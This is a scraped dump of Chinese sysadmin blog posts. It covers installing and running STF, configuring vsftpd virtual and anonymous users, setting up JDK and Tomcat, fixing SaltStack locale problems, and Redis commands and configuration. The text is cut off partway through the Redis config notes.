http://registry.npm.taobao.org/debug/download/debug-1.0.4.tgznpm http 200 http://registry.npm.taobao.org/parseqs/download/parseqs-0.0.2.tgznpm http GET http://registry.npm.taobao.org/callsite/download/callsite-1.0.0.tgznpm http 200 http://registry.npm.taobao.org/has-cors/download/has-cors-1.0.3.tgznpm http 200 http://registry.npm.taobao.org/component-inherit/download/component-inherit-0.0.3.tgznpm http 200 http://registry.npm.taobao.org/parseuri/download/parseuri-0.0.4.tgznpm http 200 http://registry.npm.taobao.org/parsejson/download/parsejson-0.0.1.tgznpm http 200 http://registry.npm.taobao.org/callsite/download/callsite-1.0.0.tgznpm http GET http://registry.npm.taobao.org/window-size/0.1.0npm http GET http://registry.npm.taobao.org/cliuinpm http GET http://registry.npm.taobao.org/decamelizenpm http GET http://registry.npm.taobao.org/camelcasenpm http 200 http://registry.npm.taobao.org/window-size/0.1.0npm http 200 http://registry.npm.taobao.org/decamelizenpm http 200 http://registry.npm.taobao.org/cliuinpm http 304 http://registry.npm.taobao.org/camelcasenpm http GET http://registry.npm.taobao.org/window-size/download/window-size-0.1.0.tgznpm http GET http://registry.npm.taobao.org/decamelize/download/decamelize-1.2.0.tgznpm http GET http://registry.npm.taobao.org/cliui/download/cliui-2.1.0.tgznpm http 200 http://registry.npm.taobao.org/window-size/download/window-size-0.1.0.tgznpm http 200 http://registry.npm.taobao.org/cliui/download/cliui-2.1.0.tgznpm http 200 http://registry.npm.taobao.org/decamelize/download/decamelize-1.2.0.tgznpm http GET http://registry.npm.taobao.org/center-alignnpm http GET http://registry.npm.taobao.org/right-alignnpm http GET http://registry.npm.taobao.org/wordwrap/0.0.2npm http 200 http://registry.npm.taobao.org/center-alignnpm http 200 http://registry.npm.taobao.org/wordwrap/0.0.2npm http GET http://registry.npm.taobao.org/center-align/download/center-align-0.1.3.tgznpm http GET http://registry.npm.taobao.org/wordwrap/download/wordwrap-0.0.2.tgznpm http 200 http://registry.npm.taobao.org/right-alignnpm http GET http://registry.npm.taobao.org/right-align/download/right-align-0.1.3.tgznpm http 200 http://registry.npm.taobao.org/wordwrap/download/wordwrap-0.0.2.tgznpm http 200 http://registry.npm.taobao.org/center-align/download/center-align-0.1.3.tgznpm http 200 http://registry.npm.taobao.org/right-align/download/right-align-0.1.3.tgznpm http GET http://registry.npm.taobao.org/align-textnpm http GET http://registry.npm.taobao.org/align-textnpm http GET http://registry.npm.taobao.org/lazy-cachenpm http 200 https://github.com/rase-/node-XMLHttpRequest/archive/a6b6f2.tar.gznpm http 200 http://registry.npm.taobao.org/align-textnpm http 200 http://registry.npm.taobao.org/align-textnpm http GET http://registry.npm.taobao.org/align-text/download/align-text-0.1.4.tgznpm http 200 http://registry.npm.taobao.org/lazy-cachenpm http GET http://registry.npm.taobao.org/lazy-cache/download/lazy-cache-1.0.4.tgznpm http 200 http://registry.npm.taobao.org/align-text/download/align-text-0.1.4.tgznpm http GET http://registry.npm.taobao.org/longnpm http GET http://registry.npm.taobao.org/bufferviewnpm http 200 http://registry.npm.taobao.org/lazy-cache/download/lazy-cache-1.0.4.tgznpm http 200 http://registry.npm.taobao.org/bufferviewnpm http GET http://registry.npm.taobao.org/bufferview/download/bufferview-1.0.1.tgznpm http GET http://registry.npm.taobao.org/kind-ofnpm http GET http://registry.npm.taobao.org/longestnpm http GET http://registry.npm.taobao.org/repeat-stringnpm http 200 http://registry.npm.taobao.org/repeat-stringnpm http GET http://registry.npm.taobao.org/repeat-string/download/repeat-string-1.5.4.tgznpm http 200 http://registry.npm.taobao.org/bufferview/download/bufferview-1.0.1.tgznpm http 200 http://registry.npm.taobao.org/longestnpm http GET http://registry.npm.taobao.org/longest/download/longest-1.0.1.tgznpm http 200 http://registry.npm.taobao.org/kind-ofnpm http GET http://registry.npm.taobao.org/kind-of/download/kind-of-3.0.3.tgznpm http 200 http://registry.npm.taobao.org/longest/download/longest-1.0.1.tgznpm http 200 http://registry.npm.taobao.org/repeat-string/download/repeat-string-1.5.4.tgznpm http 200 http://registry.npm.taobao.org/kind-of/download/kind-of-3.0.3.tgznpm http 200 http://registry.npm.taobao.org/longnpm http GET http://registry.npm.taobao.org/long/download/long-2.4.0.tgznpm http GET https://github.com/component/global/archive/v2.0.1.tar.gznpm http GET http://registry.npm.taobao.org/lodashnpm http 200 http://registry.npm.taobao.org/long/download/long-2.4.0.tgznpm http 304 http://registry.npm.taobao.org/lodashnpm http GET http://registry.npm.taobao.org/lodash/download/lodash-3.5.0.tgznpm http GET http://registry.npm.taobao.org/is-buffernpm http 200 http://registry.npm.taobao.org/lodash/download/lodash-3.5.0.tgznpm http 200 http://registry.npm.taobao.org/is-buffernpm http GET http://registry.npm.taobao.org/is-buffer/download/is-buffer-1.1.3.tgznpm http 200 http://registry.npm.taobao.org/is-buffer/download/is-buffer-1.1.3.tgznpm WARN engine is-buffer@1.1.3: wanted: &#123;\"node\":\"&gt;=0.12\"&#125; (current: &#123;\"node\":\"v0.10.26\",\"npm\":\"1.4.3\"&#125;)npm WARN engine is-buffer@1.1.3: wanted: &#123;\"node\":\"&gt;=0.12\"&#125; (current: &#123;\"node\":\"v0.10.26\",\"npm\":\"1.4.3\"&#125;)npm http GET http://registry.npm.taobao.org/sprintf-jsnpm http 200 http://registry.npm.taobao.org/sprintf-jsnpm http GET http://registry.npm.taobao.org/sprintf-js/download/sprintf-js-1.0.3.tgznpm http 200 http://registry.npm.taobao.org/sprintf-js/download/sprintf-js-1.0.3.tgznpm http 200 https://github.com/component/global/archive/v2.0.1.tar.gznpm http GET http://registry.npm.taobao.org/throughnpm http GET http://registry.npm.taobao.org/ms/0.7.0npm http 200 http://registry.npm.taobao.org/ms/0.7.0npm http GET http://registry.npm.taobao.org/ms/download/ms-0.7.0.tgznpm http 304 http://registry.npm.taobao.org/throughnpm http 200 http://registry.npm.taobao.org/ms/download/ms-0.7.0.tgznpm http GET http://registry.npm.taobao.org/bindingsnpm http GET http://registry.npm.taobao.org/nannpm http 304 http://registry.npm.taobao.org/bindingsnpm http 304 http://registry.npm.taobao.org/nan&gt; bufferutil@1.2.1 install /usr/local/lib/node_modules/stf/node_modules/ws/node_modules/bufferutil&gt; node-gyp rebuildgyp WARN EACCES user \"root\" does not have permission to access the dev dir \"/root/.node-gyp/0.10.26\"gyp WARN EACCES attempting to reinstall using temporary dev dir \"/usr/local/lib/node_modules/stf/node_modules/ws/node_modules/bufferutil/.node-gyp\"gyp http GET http://nodejs.org/dist/v0.10.26/node-v0.10.26.tar.gzgyp http 200 http://nodejs.org/dist/v0.10.26/node-v0.10.26.tar.gzmake: Entering directory `/usr/local/lib/node_modules/stf/node_modules/ws/node_modules/bufferutil/build' CXX(target) Release/obj.target/bufferutil/src/bufferutil.o SOLINK_MODULE(target) Release/obj.target/bufferutil.node SOLINK_MODULE(target) Release/obj.target/bufferutil.node: Finished COPY Release/bufferutil.nodemake: Leaving directory `/usr/local/lib/node_modules/stf/node_modules/ws/node_modules/bufferutil/build'&gt; dtrace-provider@0.5.0 install /usr/local/lib/node_modules/stf/node_modules/ldapjs/node_modules/dtrace-provider&gt; node scripts/install.js&gt; zmq@2.15.3 install /usr/local/lib/node_modules/stf/node_modules/zmq&gt; node-gyp rebuildgyp WARN EACCES user \"root\" does not have permission to access the dev dir \"/root/.node-gyp/0.10.26\"gyp WARN EACCES attempting to reinstall using temporary dev dir \"/usr/local/lib/node_modules/stf/node_modules/zmq/.node-gyp\"gyp http GET http://nodejs.org/dist/v0.10.26/node-v0.10.26.tar.gzgyp http 200 http://nodejs.org/dist/v0.10.26/node-v0.10.26.tar.gz..... 运行到这里提示： yp WARN EACCES user \"root\" does not have permission to access the dev dir \"/root/.node-gyp/0.10.26\" gyp WARN EACCES attempting to reinstall using temporary dev dir \"/usr/local/lib/node_modules/stf/node_modules/ws/node_modules/bufferutil/.node-gyp\" gyp http GET http://nodejs.org/dist/v0.10.26/node-v0.10.26.tar.gz gyp http 200 http://nodejs.org/dist/v0.10.26/node-v0.10.26.tar.gz make: Entering directory `/usr/local/lib/node_modules/stf/node_modules/ws/node_modules/bufferutil/build' CXX(target) Release/obj.target/bufferutil/src/bufferutil.o SOLINK_MODULE(target) Release/obj.target/bufferutil.node STF运行一、启动rethinkDB 安装完成后，打开单独的控制台，运行命令等待服务启动完成： rethinkdb 二、启动stf服务端打开一个单独的控制台，运行命令等待服务启动完成： stf local 注：这里我多加了个参数 –allow-remote用于允许远程调试设备连接 三、运行客户端在浏览器中输入地址：http://localhost:7100/ 访问客户端。 输入用户名和邮箱登录即可开始使用。 然后就可以在页面上直接控制连接的设备了，按照官方的说法，可以控制more than 160 devices. 当然 要有好的hub或者无线环境。其他的以后进一步发掘吧。","raw":null,"content":null,"categories":[{"name":"测试","slug":"测试","permalink":"http://blog.yangcvo.me/categories/测试/"}],"tags":[{"name":"STF","slug":"STF","permalink":"http://blog.yangcvo.me/tags/STF/"}]},{"title":"建立虚拟用户的vsftpd安装配置过程","slug":"Vsftpd/建立虚拟用户的vsftpd安装配置过程","date":"2015-11-25T04:22:10.000Z","updated":"2017-03-16T06:19:48.000Z","comments":true,"path":"2015/11/25/Vsftpd/建立虚拟用户的vsftpd安装配置过程/","link":"","permalink":"http://blog.yangcvo.me/2015/11/25/Vsftpd/建立虚拟用户的vsftpd安装配置过程/","excerpt":"","text":"建立虚拟用户的vsftpd安装配置过程虚拟用户的特点是只能访问服务器为其提供的FTP服务，而不能访问系统的其它资源。所以，如果想让用户对FTP服务器站内具有写权限，但又不允许访问系统其它资源，可以使用虚拟用户来提高系统的安全性。在VSFTP中，认证这些虚拟用户使用的是单独的口令库文件（pam_userdb），由可插入认证模块（PAM）认证。使用这种方式更加安全，并且配置更加灵活。 下面介绍配置过程。 建立虚拟用户的vsftpd安装配置过程 1.安装vsftpd服务，和测试命令ftp 1# yum -y install vsftpd ftp 2.建立虚拟用户的用户名/密码数据库vsftpd服务的虚拟用户数据库使用的是Berkeley DB格式的数据文件。建立数据库文件要用到db_load命令工具，所以要安装db4软件包 1# yum -y install db4* 3.生成虚拟用户口令库文件。为了建立此口令库文件，先要生成一个文本文件。该文件的格式如下，单数行为用户名，偶数行为口令：建立文本格式的用户名/密码列表文件，奇数行为用户名，偶数行对应为上一行用户名密码。 123# vim /etc/vsftpd/virtual_loginaccp 虚拟用户123.com 虚拟用户密码 4.用db_load工具将列表文件转化为DB数据库文件。 12# db_load -T -t hash -f /etc/vsftpd/virtual_login /etc/vsftpd/virtual_login.db# chown /etc/vsftpd/vuser.* //降低文件权限以提高安全性 5.建立PAM认证文件 1234#vi /etc/pam.d/vsftpd 添加如下内容#%PAM-1.0auth required pam_userdb.so db=/etc/vsftpd/ vusersaccount required pam_userdb.so db=/etc/vsftpd/vusers 6.建立FTP访问根目录以及虚拟用户对应的系统账号 这里我给用户指定这里的虚拟用户和对应的系统账号 1234#useradd -s /sbin/nologin vsftpd#useradd -d /var/www/html/ftp3 -s /sbin/nologin ftp3#chmod 755 /var/www/html/ftp3#cp /etc/vsftpd/vsftpd.conf /etc/vsftpd/vsftpd.conf.bak 经过该步骤的设置，/var/www/html/accp就是virtual_user用户的主目录，该用户也是accp目录的拥有者。除root用户之外，只有该用户具有对该目录的读、写和执行的权限。 7.修改vsftpd的主配置文件，添加对虚拟用户的支持。 12345678910111213141516171819202122232425262728#vi /etc/vsftpd/vsftpd.conf #内容如下anonymous_enable=NO 这里设置禁止匿名登录local_enable=YESwrite_enable=YES 全局配置可写local_umask=022anon_upload_enable=NOanon_mkdir_write_enable=NOdirmessage_enable=YESxferlog_enable=YESconnect_from_port_20=YESchown_uploads=NOxferlog_file=/var/log/vsftpd.logxferlog_std_format=YESnopriv_user=vsftpdasync_abor_enable=YESascii_upload_enable=YESascii_download_enable=YESftpd_banner=Welcome to $username FTP servicechroot_list_enable=YESchroot_list_file=/etc/vsftpd/chroot_listlisten=YESpam_service_name=vsftpduserlist_enable=YEStcp_wrappers=YESguest_enable=YESvirtual_use_local_privs=YESguest_username=ftp3 这里添加你虚拟用户的支持user_config_dir=/etc/vsftpd/vsftpd_config 7.为accp和java建立独立配置目录及文件 123456mkdir /etc/vsftpd/vsftpd_config/touch /var/log/vsftpd.logchmod 600 /var/log/vsftpd.logchown vsftpd.vsftpd /var/log/vsftpd.logtouch /etc/vsftpd/chroot_listcd /etc/vsftpd/vsftpd_config/ 1234567891011#vim accp ###添加如下内容anon_upload_enable=YESanon_mkdir_write_enable=YESguest_enable=yesguest_username=$usernamelocal_root=/var/www/html/$usernameidle_session_timeout=600data_connection_timeout=120max_clients=10max_per_ip=5local_max_rate=0 touch java 建立空文件，默认配置文件中的权限8.启动vsftpd服务 1service vsftpd start 权限：john可以登录到ftp服务器，可以浏览，下载，也可以上传文件 mike可以登录到ftp服务器，可以浏览，下载，但是不可以上传 9.本地测试：（一）john的测试 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879[root@YTB-APP-1 ~]# lsanaconda-ks.cfg bin importipas.sh install.log install.log.syslog my.cnf.bak[root@YTB-APP-1 ~]# ftp 127.0.0.1Trying ::1...ftp: connect to address ::1Connection refusedTrying 127.0.0.1...Connected to localhost (127.0.0.1).220 (vsFTPd 2.2.2)Name (localhost:ytb): john331 Please specify the password.Password:230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls227 Entering Passive Mode (127,0,0,1,82,29).150 Here comes the directory listing.-rw-r--r-- 1 0 0 574 Jul 01 14:50 vutest.file226 Directory send OK.ftp&gt; get vutest.filelocal: vutest.file remote: vutest.file227 Entering Passive Mode (127,0,0,1,103,164).150 Opening BINARY mode data connection for vutest.file (574 bytes).226 Transfer complete.574 bytes received in 3.4e-05 secs (16882.35 Kbytes/sec)ftp&gt; put install.loglocal: install.log remote: install.log227 Entering Passive Mode (127,0,0,1,115,162).150 Ok to send data.226 Transfer complete.29388 bytes sent in 0.024 secs (1222.97 Kbytes/sec)ftp&gt; quit221 Goodbye.[root@YTB-APP-1 ~]# lsanaconda-ks.cfg bin importipas.sh install.log install.log.syslog my.cnf.bak vutest.file[root@YTB-APP-1 ~]# ls /data/pub/install.log vutest.file[root@YTB-APP-1 ~]#（二）mike的测试[root@YTB-APP-1 ~]# lsanaconda-ks.cfg bin importipas.sh install.log install.log.syslog my.cnf.bak vutest.file[root@YTB-APP-1 ~]# rm -rf vutest.file[root@YTB-APP-1 ~]# ftp localhostTrying ::1...ftp: connect to address ::1Connection refusedTrying 127.0.0.1...Connected to localhost (127.0.0.1).220 (vsFTPd 2.2.2)Name (localhost:ytb): mike331 Please specify the password.Password:230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls227 Entering Passive Mode (127,0,0,1,223,141).150 Here comes the directory listing.-rw-r--r-- 1 503 503 29388 Jul 03 02:23 install.log-rw-r--r-- 1 0 0 574 Jul 01 14:50 vutest.file226 Directory send OK.ftp&gt; get vutest.filelocal: vutest.file remote: vutest.file227 Entering Passive Mode (127,0,0,1,154,230).150 Opening BINARY mode data connection for vutest.file (574 bytes).226 Transfer complete.574 bytes received in 3.8e-05 secs (15105.26 Kbytes/sec)ftp&gt; put install.log.sysloglocal: install.log.syslog remote: install.log.syslog227 Entering Passive Mode (127,0,0,1,227,247).550 Permission denied.ftp&gt; quit221 Goodbye.[root@YTB-APP-1 ~]# lsanaconda-ks.cfg bin importipas.sh install.log install.log.syslog my.cnf.bak vutest.file[root@YTB-APP-1 ~]# ls /dat/pub/ls: cannot access /dat/pub/: No such file or directory[root@YTB-APP-1 ~]# ls /data/pub/install.log vutest.file[root@YTB-APP-1 ~]# 10.Mac连接方式使用方法： 12345Mac连接方式：sftp ftp3@192.168.1.211ftp3@192.168.1.211's password: 输入密码查看方式：sftp&gt; ls -lh-rw-r--r-- 0 1004 1004 39.2M Apr 1 17:23 ccc.war 上传使用put 下载使用getput /Users/jules/Downloads/haozhuo-check.war 就是把本地的时check上传。 这里就连接成功了，如果后续还要添加账户只需要在vi /etc/vsftpd/vusers.list然后在用db_load工具将列表文件转化为DB数据库文件。 12# cd /etc/vsftpd/#db_load -T -t hash -f vusers.list vusers.db 添加好以后给该用户指定一个对应的创建目录。 1useradd -d /data/www -s /sbin/nologin accp 虚拟用户名 然后就可以连接了。最后给每个用户做用户权限的时候也是可以的。 直接在/etc/vsftpd/vusers_dir目录下面创建用户txt 给予权限。 因为我在vsftpd.conf做了配置。 指定给特殊用户权限访问。 help 那么现在大家看看我的匿名服务器配置文件吧 123456789101112131415161718anonymous_enable=YES //允许匿名访问，这是匿名服务器必须的write_enable=YES //全局配置可写no_anon_password=YES //匿名用户login时不询问口令anon_umask=077 //匿名用户上传的文件权限是-rw----anon_upload_enable=YES //允许匿名用户上传文件anon_mkdir_write_enable=YES //允许匿名用户建立目录anon_other_write_enable=YES //允许匿名用户具有建立目录，上传之外的权限，如重命名，删除dirmessage_enable=YES //当使用者转换目录,则会显示该目录下的.message信息xferlog_enable=YES //记录使用者所有上传下载信息xferlog_file=/var/log/vsftpd.log //将上传下载信息记录到/var/log/vsftpd.log中xferlog_std_format=YES //日志使用标准xferlog格式idle_session_timeout=600 //客户端超过600S没有动作就自动被服务器踢出data_connection_timeout=120 //数据传输时超过120S没有动作被服务器踢出chown_uploads=YESchown_username=daemon //上传文件的属主ftpd_banner=Welcome to d-1701.com FTP service. //FTP欢迎信息anon_max_rate=80000 //这是匿名用户的下载速度为80KBytes/scheck_shell=NO //不检测SHELL 需要脚本的留言我即可。","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.yangcvo.me/categories/Linux/"}],"tags":[{"name":"Linux note","slug":"Linux-note","permalink":"http://blog.yangcvo.me/tags/Linux-note/"},{"name":"Vsftpd","slug":"Vsftpd","permalink":"http://blog.yangcvo.me/tags/Vsftpd/"}]},{"title":"搭建配置tomcat环境","slug":"Web服务技术/tomcat/搭建配置tomcat环境","date":"2015-11-21T07:44:05.000Z","updated":"2017-03-16T06:14:37.000Z","comments":true,"path":"2015/11/21/Web服务技术/tomcat/搭建配置tomcat环境/","link":"","permalink":"http://blog.yangcvo.me/2015/11/21/Web服务技术/tomcat/搭建配置tomcat环境/","excerpt":"","text":"先安装jdk-java环境首先先检查linux机器上是否有自带的jdk,一般不建议用yum安装，环境变量不方便自定义。 java -version检查下就可以，如果有版本低的话可以先卸载掉方法如下： 1234[root@localhost java]# rpm -qa|grep gcj 或者 rpm -qa|grep javalibgcj-4.1.2-44.el5java-1.4.2-gcj-compat-1.4.2.0-40jpp.115 如果没有信息就是没有安装、如果有那么如下操作: 123[root@localhost]# yum -y remove java-1.4.2-gcj-compat-1.4.2.0-40jpp.115 或者 rpm -e --nodeps java-1.4.2-gcj-compat-1.4.2.0-40jpp.115Complete!(看到这个说明完成了。。) 卸载完成了 如果其他目录有这个安装好的。直接拷贝过去，做个变量就行. JDK官网下载地址：jdk-8u60-linux-x64.tar.gz 编译安装jdk 12345678curl -O http://oak0aohum.bkt.clouddn.com/jdk1.7.0_67.tar.gz -C /srv/设置环境变量：cd /etc/profile.d/ 放到这下面写个变量java.shexport JAVA_HOME=/srv/jdk1.7.0_67export CLASS_PATH=\"$JAVA_HOME/lib:$JAVA_HOME/jre/lib\"export PATH=$PATH:$JAVA_HOME/bin 添加完毕保存退出. 123source /etc/profileecho $JAVA_HOME/usr/java/jdk1.7.0 安装：apache-tomcat 先下载tomcat包：apache-tomcat-8.0.41-src.tar.gz 配置端口 b不要有冲突了默认是8080这里修改成8082。 （1）采用记事本打开Tomcat安装目录下的conf文件夹下的servlet.xml文件。（2）在servlet.xml文件中找到以下代码： 123 &lt;Connector port=\"8082\" protocol=\"HTTP/1.1\" URIEncoding=\"UTF-8\"connectionTimeout=\"20000\" redirectPort=\"8443\" /&gt; （3）将上面代码中的port=&quot;8080&quot;修改为port=&quot;8082&quot;，即可将Tomcat的默认端口设置为8081。在修改端口时，应避免与公用端口冲突。建议采用默认的8080端口，不要修改，除非8080端口被其他程序所占用。 Connector子元素下的port是设置服务器端口，而connection Timeout则是服务器连接超时单位为毫秒. （4）URIEncoding=”UTF-8 设置是让tomcat支持中文，不会出现乱码 ###配置防火墙 允许然后把8082 这个端口开放到指定的办公网络端口访问。 1-A INPUT -i eth0 -s 192.168.1.0/24 -p tcp -m state --state NEW -m tcp --dport 8082 -j ACCEPT 进入linux系统下tomcat的bin目录， 比如，进入到 apache-tomcat-7.0.42/bin 目录 关闭一下tomcat服务，特别是已经启动的情况下，只不过有些异常 1./shutdown.sh ####3. 检查tomcat启动进程 ps -ef|grep tomcat 假如出现以下类似的提示，表示tomcat已经关闭 root 30248 30113 0 10:00 pts/0 00:00:00 grep java ####4. 最后重新启动tomcat 1./startup.sh 也可以写启动脚本，配置好jdk和tomcat的环境变量。","raw":null,"content":null,"categories":[{"name":"tomcat","slug":"tomcat","permalink":"http://blog.yangcvo.me/categories/tomcat/"}],"tags":[{"name":"Java+Tomcat notes","slug":"Java-Tomcat-notes","permalink":"http://blog.yangcvo.me/tags/Java-Tomcat-notes/"}]},{"title":"自动化运维工具--saltstack远程启动tomcat日志乱码","slug":"自动化+可视化/saltstack/自动化运维工具--saltstack远程启动tomcat日志乱码 ","date":"2015-11-20T09:56:03.000Z","updated":"2017-03-29T11:41:54.000Z","comments":true,"path":"2015/11/20/自动化+可视化/saltstack/自动化运维工具--saltstack远程启动tomcat日志乱码 /","link":"","permalink":"http://blog.yangcvo.me/2015/11/20/自动化+可视化/saltstack/自动化运维工具--saltstack远程启动tomcat日志乱码 /","excerpt":"","text":"自动化运维工具–saltstack远程启动tomcat日志乱码最近在线上发布tomcat，想做到自动部署，可是出现了问题，就是日志输出会有乱码，用户名的getMyUserInfo 是一堆乱码，salt原理系统字符集没太深入的研究，后来在墙外看到一篇文章很实用，就做了下自己的总结。 开始我是salt执行远程脚本。 1salt 'tomcat_A1' cmd.run '/etc/init.d/tomcat-account start' 直接这样去执行，发现会出现乱码。 这是日志输出结果，我用curl去调我的userinfoid： 调用之前我这边先删除了指定的用户信息redis的缓存，然后在用curl在另外一台机器上面调用看看。 tomcat_A1 机器日志：乱码： 123456781nickname1:?????????11111nickname1:?????????33333334????????? 在minion设置字符集增加LCALL=”zhUS.UTF-8″： cat /etc/sysconfig/i18n 123LANG=\"en_US.UTF-8\"LC_ALL=\"zh_US.UTF-8\"SYSFONT=\"latarcyrheb-sun16\" cmd.run 调用时需要加入env=’{“LCALL”:“zhCN.UTF-8”}’： 1234salt 'tomcat_A1' cmd.run '/etc/init.d/tomcat-account sop' env='&#123;\"LC_ALL\": \"zh_CN.UTF-8\"&#125;'###先关闭tomcatsalt 'tomcat_A1' cmd.run '/etc/init.d/tomcat-account start' env='&#123;\"LC_ALL\": \"zh_CN.UTF-8\"&#125;'###在启动tomcat 在调用查看 日志就恢复正常了。数据库的用户名id也正常了，如果你写发布脚本把tomcat启动写在执行脚本里面的话，如果添加了不行，就拆分开，就可以了。 这是一次血的教训啊，对字符集不是很多，完全摸不着头脑，还好多普及了下，终于弄好了。","raw":null,"content":null,"categories":[{"name":"Automation","slug":"Automation","permalink":"http://blog.yangcvo.me/categories/Automation/"}],"tags":[{"name":"Automation","slug":"Automation","permalink":"http://blog.yangcvo.me/tags/Automation/"},{"name":"Saltstack","slug":"Saltstack","permalink":"http://blog.yangcvo.me/tags/Saltstack/"}]},{"title":"Redis与mamcache区别redis常用命令积累","slug":"数据库/Redis/Redis与mamcache区别redis常用命令积累","date":"2015-11-20T09:51:27.000Z","updated":"2017-04-06T07:26:15.000Z","comments":true,"path":"2015/11/20/数据库/Redis/Redis与mamcache区别redis常用命令积累/","link":"","permalink":"http://blog.yangcvo.me/2015/11/20/数据库/Redis/Redis与mamcache区别redis常用命令积累/","excerpt":"","text":"redis与mamcache区别&amp;redis常用命令积累之前一直有在用mamcache集群，现在出来了redis用的多的还是现在的redis主从，集群等。 ##redis与mamcache区别 也仔细了做了这两种存储数据库也叫内存数据库它们的区别： 123456781、 Redis和Memcache都是将数据存放在内存中，都是内存数据库。不过memcache还可用于缓存其他东西，例如图片、视频等等。2、Redis不仅仅支持简单的k/v类型的数据，同时还提供list，set，hash等数据结构的存储。3、虚拟内存--Redis当物理内存用完时，可以将一些很久没用到的value 交换到磁盘4、过期策略--memcache在set时就指定，例如set key1 0 0 8,即永不过期。Redis可以通过例如expire 设定，例如expire name 105、分布式--设定memcache集群，利用magent做一主多从;redis可以做一主多从。都可以一主一从6、存储数据安全--memcache挂掉后，数据没了；redis可以定期保存到磁盘（持久化）7、灾难恢复--memcache挂掉后，数据不可恢复; redis数据丢失后可以通过aof恢复8、Redis支持数据的备份，即master-slave模式的数据备份。 redis优点： 有很好的存储数据安全功能，和灾难恢复，更加支撑Redis支持数据的备份。 而memcache优点：memcache还可用于缓存其他东西，例如图片、视频等等。 ##redis 命令 123456789101112131415161718192021222324252627282930313233343536373839401. redis查看当前所有的key keys * 或 keys \"*\"2. 查看当前redis的配置信息 CONFIG GET *3. 查看匹配前缀的keyskeys \"miao*\"4. 清空redisflushdb5.随机取出一个keyrandomkey6. 查看key的类型type key7. 查看数据库中key的数量dbsize8. 查看服务器信息info9.查看redis正在做什么monitor10.查看日志slowlog getslowlog get 10 redis是key-value存储的，放在内存中，并在磁盘持久化的数据结构存储系统，它可以用作数据库、缓存和消息中间件。 ####1. 设置key的值,若存在则覆盖 set key value: key设置key的值,若存在则覆盖 1234127.0.0.1:6379&gt; SET yangc \"haozhuo\"OK127.0.0.1:6379&gt; get yangc\"haozhuo\" ####2.redis提供原子自增操作incr,用来防止多线程并发出现数据错误。 1234incr key:原子的+1；DECR key：原子的-1；DECRBY key integer：原子的-integer；INCRBY key integer：原子的+integer ####3.删除操作：del.若数据不存在返回(nil) 1234127.0.0.1:6379&gt; DEL yangc(integer) 1127.0.0.1:6379&gt; get yangc(nil) ####4.redis可以定时存储，即设置几秒后删除该变量 expire key多少秒：设置多少秒后过期； ttl key:Time To Live，查看还可以存活多久，-2表示key不存在；-1表示定时任务消失，永久存储。 EXPIRE key seconds：设置该元素多少秒后失效 PEXPIRE key milliseconds：设置该元素多少毫秒后失效 TTL key：查看还可以存活多少秒，-2表示key不存在，-1表示永久存储 SETEX key seconds value：等价于先设置变量再设置超时，即在缓存中使用：存储的同时设置超时时间，这个操作是原子的 persist key:取消过期时间 expireat key 时间戳：unix时间戳，1970.1.1之后，这个绝对时间，将在这个时间删除key。expireatpages:about 1356933600：在2012年12月31日上午12点删除掉关键字 SETEX KEY_NAME TIMEOUT VALUE：设置key的值为value，并在timeout秒后失效，key将被删除 ####举例： 这里我举例了创建了一个key值，然后设置多少秒失效，查看的时候还有3秒，再次查看-2秒。 123456789101112127.0.0.1:6379&gt; set yangc \"youjiankan\"OK127.0.0.1:6379&gt; EXPIRE yangc 20(integer) 1127.0.0.1:6379&gt; get yangc\"youjiankan\"127.0.0.1:6379&gt;127.0.0.1:6379&gt; ttl yangc(integer) 3127.0.0.1:6379&gt; ttl yangc(integer) -2127.0.0.1:6379&gt; ttl yangc 这个例子是设置多少秒失效取消时间后永久存储着，ttl查看是-1 123456789101112131415161718127.0.0.1:6379&gt; set yangc \"haopengyou\"OK127.0.0.1:6379&gt; EXPIRE yangc 40(integer) 1127.0.0.1:6379&gt; get yangc\"haopengyou\"127.0.0.1:6379&gt; ttl yangc(integer) 34127.0.0.1:6379&gt; ttl yangc(integer) 33127.0.0.1:6379&gt; ttl yangc(integer) 32127.0.0.1:6379&gt; PERSIST yangc(integer) 1127.0.0.1:6379&gt; ttl yangc(integer) -1127.0.0.1:6379&gt; ttl yangc(integer) -1 12redis 127.0.0.1:6379&gt; CONFIG SET logfile \"/var/log/redis/redis-server.log\"(error) ERR Unsupported CONFIG parameter: logfile logfile 不能通过set动态设置 ####5.(error) OOM command not allowed when used memory &gt;设置了maxmemory的选项,redis内存使用达到上限。可以通过设置LRU算法来删除部分key,释放空间。默认是按照过期时间的,如果set时候没有加上过期时间就会导致数据写满maxmemory。如果不设置maxmemory或者设置为0 64位系统不限制内存，32位系统最多使用3GB内存。 123456volatile-lru -&gt; 根据LRU算法生成的过期时间来删除。allkeys-lru -&gt; 根据LRU算法删除任何key。volatile-random -&gt; 根据过期设置来随机删除key。allkeys-&gt;random -&gt; 无差别随机删。volatile-ttl -&gt; 根据最近过期时间来删除（辅以TTL）noeviction -&gt; 谁也不删，直接在写操作时返回错误。 ####6. reids日志位置logfile 日志记录方式，默认值为stdout，如果设置为stdout且以守护进程方式运行，那么日志会被重定向到/dev/null,也就是不记日志。 ####7. reids配置参数详解 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246#daemonize no 默认情况下， redis 不是在后台运行的，如果需要在后台运行，把该项的值更改为 yesdaemonize yes# 当 redis 在后台运行的时候， Redis 默认会把 pid 文件放在 /var/run/redis.pid ，你可以配置到其他地址。# 当运行多个 redis 服务时，需要指定不同的 pid 文件和端口pidfile /var/run/redis_6379.pid# 指定 redis 运行的端口，默认是 6379port 6379# 在高并发的环境中，为避免慢客户端的连接问题，需要设置一个高速后台日志tcp-backlog 511# 指定 redis 只接收来自于该 IP 地址的请求，如果不进行设置，那么将处理所有请求# bind 192.168.1.100 10.0.0.1# bind 127.0.0.1# 设置客户端连接时的超时时间，单位为秒。当客户端在这段时间内没有发出任何指令，那么关闭该连接# 0 是关闭此设置timeout 0# TCP keepalive# 在 Linux 